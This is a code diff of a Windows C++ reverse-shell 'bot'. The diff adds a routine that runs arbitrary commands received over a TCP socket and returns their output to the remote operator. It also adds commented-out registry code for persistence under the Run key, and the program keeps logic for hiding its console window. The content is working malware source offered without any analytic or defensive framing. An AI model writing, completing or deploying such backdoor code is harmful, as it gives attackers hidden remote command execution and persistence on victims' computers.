@@ -1,13 +1,29 @@
 #include<WinSock2.h>
-#include<Windows.h>
 #include<WS2tcpip.h>
 #include<iostream>
+#include<Windows.h>
+#include<stdexcept>
+#include<array>
+
 
 #pragma comment(lib, "ws2_32.lib")
 #define DEFAULT_BUFFLEN 1024
 #pragma warning(disable:4996)
 
 void RevShell();
+
+std::string exec(const char* cmd) {
+	std::array<char, 256> buff;
+	std::string result;
+	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+	if (!pipe) {
+		throw std::runtime_error("_popen() failed!");
+	}
+	while (fgets(buff.data(), buff.size(), pipe.get()) != nullptr) {
+		result += buff.data();
+	}
+	return result;
+}
 
 int main() {
 	HWND stealth; // Declare windows handle 
@@ -19,6 +35,15 @@ int main() {
 	stealth = FindWindowA("ConsoleWindowClass", NULL); // Find the previous Window handler and hide/show the window depending upon the next command
 	ShowWindow(stealth, SW_SHOWNORMAL); // Set show or hide windows console SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
 
+	// Get current directory to bot
+	TCHAR CurrentDirectory[MAX_PATH] = { 0 };
+	GetModuleFileName(NULL, CurrentDirectory, MAX_PATH);
+	/*
+	// Set bot startup with windows
+	HKEY hKey = NULL;
+	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+	LONG status = RegSetValueExW(hKey, L"bot", 0, REG_SZ, (BYTE*)CurrentDirectory, (sizeof(CurrentDirectory) + 1) * (sizeof(wchar_t)));
+	*/
 	RevShell();
 
 	return 0;
@@ -53,7 +78,6 @@ void RevShell() {
 			}
 			else {
 				if (strcmp(CommandReceive, "whoami") == 0) {
-					std::cout << "Command whoami\n";
 					// Execute whoami
 					char UserName[257] = "";
 					DWORD returnSize = 257;
@@ -63,7 +87,6 @@ void RevShell() {
 
 				}
 				else if (strcmp(CommandReceive, "pwd") == 0) {
-					std::cout << "Command pwd\n";
 					// Execute pwd
 					char CurrentDirectory[MAX_PATH] = "";
 					GetCurrentDirectory(MAX_PATH, (LPWSTR)CurrentDirectory);
@@ -71,31 +94,21 @@ void RevShell() {
 					memset(CurrentDirectory, 0, sizeof(CurrentDirectory));
 
 				}
-				else if (strncmp(CommandReceive, "exec", 4) == 0){
-					std::cout << "Command exec\n";
-					// Execute cd
-					char CommandExec[DEFAULT_BUFFLEN] = "";
-					int j = 0;
-					for (int i = 5; i < (*(&CommandReceive + 1) - CommandReceive); i++) {
-						CommandExec[j] = CommandReceive[i];
-						j++;
-					}
-					char buffer[1024] = "";
-					
-
-				}
 				else if (strcmp(CommandReceive, "exit") == 0) {
-					std::cout << "Command ext\n";
+					// Execute exit
 					std::cout << "Connection close\n";
 					break;
-					// Execute exit
+					
 				}
 				else {
-					std::cout << "Command not found: " << CommandReceive << std::endl;
+					// Execute cmd
+					std::string buff = exec(CommandReceive);
+					const char* result = buff.c_str();
+					send(tcpSock, result, strlen(result) + 1, 0);
 				}
-
+				memset(CommandReceive, 0, sizeof(CommandReceive));
 			}
-			memset(CommandReceive, 0, sizeof(CommandReceive));
+			
 		}
 
 	}
